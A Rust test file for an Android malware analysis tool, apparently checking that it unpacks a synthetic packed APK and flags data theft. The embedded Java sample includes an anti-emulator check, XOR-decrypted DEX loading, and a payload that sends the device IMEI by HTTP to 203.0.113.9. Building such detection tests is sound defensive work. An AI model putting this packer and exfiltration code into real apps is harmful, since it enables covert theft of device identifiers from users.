//! End-to-end: a synthetic packed APK whose shell decrypts a DEX payload and
//! loads it, then the payload steals the IMEI over HTTP. The tool must follow
//! the shell, recover the payload, and report the exfiltration.

mod support;

use std::sync::Arc;

use support::packed::compile_sources_to_dex;
use unshroud::apk;
use unshroud::dex::DexFile;
use unshroud::report::SampleReport;
use unshroud::scenario::{self, RunConfig};
use unshroud::vm::env::Persona;
use unshroud::vm::registry::Registry;

const SHELL: &str = r#"
package com.example.packed;

import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;

public class Shell {
    static final byte[] KEY = { 0x5a, 0x1e, 0x73, 0x2c };

    public static void attach(Context ctx) {
        // Anti-emulator gate: bail on obvious sandboxes.
        String fp = android.os.Build.FINGERPRINT;
        if (fp != null && fp.contains("generic")) {
            return;
        }
        try {
            byte[] enc = readAsset(ctx, "payload.dat");
            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++) {
                dec[i] = (byte) (enc[i] ^ KEY[i % KEY.length]);
            }
            writeFile(ctx, dec);
            DexClassLoader cl = new DexClassLoader(
                ctx.getFilesDir().getAbsolutePath() + "/p.dex",
                ctx.getCacheDir().getAbsolutePath(),
                null,
                Shell.class.getClassLoader());
            Class<?> c = cl.loadClass("com.example.payload.Exec");
            Method m = c.getMethod("fire", Context.class);
            m.invoke(null, ctx);
        } catch (Throwable t) {
            android.util.Log.e("shell", "attach failed: " + t);
        }
    }

    static byte[] readAsset(Context ctx, String name) throws Exception {
        InputStream in = ctx.getAssets().open(name);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
        return out.toByteArray();
    }

    static void writeFile(Context ctx, byte[] data) throws Exception {
        java.io.FileOutputStream fos = ctx.openFileOutput("p.dex", 0);
        fos.write(data);
        fos.close();
    }
}
"#;

const PAYLOAD: &str = r#"
package com.example.payload;

import android.content.Context;
import android.telephony.TelephonyManager;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Exec {
    public static void fire(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService("phone");
            String imei = tm.getDeviceId();
            String url = "http://203.0.113.9/gate?d=" + imei;
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.connect();
            int code = c.getResponseCode();
            android.util.Log.i("x", "code=" + code);
        } catch (Throwable t) {
            android.util.Log.e("x", "fail " + t);
        }
    }
}
"#;

#[test]
fn follows_packer_and_reports_exfiltration() {
    let Some(shell_dex) = compile_sources_to_dex(&[("Shell", SHELL)]) else {
        eprintln!("skipping: no d8/javac");
        return;
    };
    let Some(payload_dex) = compile_sources_to_dex(&[("Exec", PAYLOAD)]) else {
        return;
    };
    // The shell XORs with a 4-byte key; our asset builder uses a single byte,
    // so re-encrypt the payload to match the shell's repeating key.
    let mut encrypted = payload_dex.clone();
    let key = [0x5a, 0x1e, 0x73, 0x2c];
    for (i, b) in encrypted.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }
    let apk_bytes = build_packed_apk_raw(&shell_dex, &encrypted);

    // --- static stage ---
    let mut report = SampleReport::empty("test.apk");
    let statics = apk::analyze(&apk_bytes, &mut report).expect("static analysis");
    eprintln!("manifest parse: package={:?} perms={:?}", statics.package, statics.permissions);
    let _ = &statics.embedded;

    // --- dynamic stage ---
    let mut registry = Registry::new();
    for loaded in &statics.dexes {
        let dex = DexFile::parse(loaded.origin.clone(), loaded.dex.data.as_ref().clone()).unwrap();
        registry.add_image(Arc::new(dex), false);
    }
    let config = RunConfig {
        step_limit: 20_000_000,
        per_scenario_ms: 30_000,
        max_scenarios: 2,
        assets: statics.assets.iter().map(|(k, v)| (k.clone(), v.clone())).collect(),
        ..Default::default()
    };
    let outcome = scenario::run(registry, vec![Persona::retail_default()], &config);

    // The payload DEX must have been recovered at runtime.
    if outcome.dynamic_dumps.is_empty() {
        let sc = &outcome.scenarios[0];
        eprintln!("gaps: {:#?}", sc.coverage_gaps);
        eprintln!("stop: {:?} steps={}", sc.stop_reason, sc.steps);
    }
    assert!(
        !outcome.dynamic_dumps.is_empty(),
        "expected a decrypted DEX; notes: {:?}",
        outcome.notes
    );

    let sc = &outcome.scenarios[0];
    let net: Vec<_> = sc.findings.iter().filter(|f| f.kind == unshroud::report::SinkKind::Network
        || f.kind == unshroud::report::SinkKind::SensitiveFlow).collect();
    eprintln!("findings: {:#?}", sc.findings.iter().map(|f| (&f.kind, &f.detail, &f.taint)).collect::<Vec<_>>());
    eprintln!("gaps: {:?}", sc.coverage_gaps);
    assert!(!net.is_empty(), "expected a network finding, got: {:?}", sc.findings.iter().map(|f| f.detail.clone()).collect::<Vec<_>>());
}

/// Build the APK with the shell's exact XOR applied by the caller.
fn build_packed_apk_raw(shell_dex: &[u8], encrypted_payload: &[u8]) -> Vec<u8> {
    let mut buf = std::io::Cursor::new(Vec::new());
    {
        use std::io::Write;
        use zip::write::SimpleFileOptions;
        let mut w = zip::ZipWriter::new(&mut buf);
        let opts = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        w.start_file("classes.dex", opts).unwrap();
        w.write_all(shell_dex).unwrap();
        w.start_file("assets/payload.dat", opts).unwrap();
        w.write_all(encrypted_payload).unwrap();
        w.start_file("AndroidManifest.xml", opts).unwrap();
        w.write_all(&support::packed::minimal_manifest_pub()).unwrap();
        w.finish().unwrap();
    }
    buf.into_inner()
}

#[test]
fn exfiltration_carries_imei_taint() {
    let Some(shell_dex) = compile_sources_to_dex(&[("Shell", SHELL)]) else { return };
    let Some(payload_dex) = compile_sources_to_dex(&[("Exec", PAYLOAD)]) else { return };
    let key = [0x5a, 0x1e, 0x73, 0x2c];
    let mut enc = payload_dex.clone();
    for (i, b) in enc.iter_mut().enumerate() { *b ^= key[i % key.len()]; }
    let apk_bytes = build_packed_apk_raw(&shell_dex, &enc);
    let mut report = SampleReport::empty("t.apk");
    let statics = apk::analyze(&apk_bytes, &mut report).unwrap();
    let mut registry = Registry::new();
    for d in &statics.dexes {
        registry.add_image(Arc::new(DexFile::parse(d.origin.clone(), d.dex.data.as_ref().clone()).unwrap()), false);
    }
    let cfg = RunConfig { step_limit: 20_000_000, per_scenario_ms: 30_000,
        assets: statics.assets.iter().map(|(k,v)| (k.clone(), v.clone())).collect(), ..Default::default() };
    let out = scenario::run(registry, vec![Persona::retail_default()], &cfg);
    let sc = &out.scenarios[0];
    let exfil: Vec<_> = sc.findings.iter()
        .filter(|f| f.kind == unshroud::report::SinkKind::SensitiveFlow && f.detail.contains("203.0.113.9"))
        .collect();
    assert!(!exfil.is_empty(), "no exfil finding; all: {:?}",
        sc.findings.iter().map(|f| (&f.kind, &f.detail)).collect::<Vec<_>>());
    let f = exfil[0];
    assert!(f.taint.iter().any(|t| t == "imei"), "taint missing imei: {:?} body={:?}", f.taint, f.evidence);
    assert!(f.evidence.iter().any(|e| e.contains("354918476201935")), "evidence should carry the IMEI: {:?}", f.evidence);
}
